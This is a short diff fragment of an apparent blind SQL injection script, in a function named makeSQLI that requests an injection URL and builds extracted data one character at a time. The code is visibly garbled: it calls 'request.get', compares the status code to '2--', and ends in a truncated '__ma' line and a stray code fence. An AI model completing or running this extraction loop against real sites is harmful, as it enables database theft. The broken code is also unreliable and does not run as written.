@@ -79,5 +79,8 @@ def makeSQLI():
 	r = request.get(sqli_url)
 
 	if r.status_code == 2--:
-		extracted_info +=
+		extracted_info += chr(character)
+		p2.status(extracted_info)
+		break
+if __name__ == '__ma'
 ```
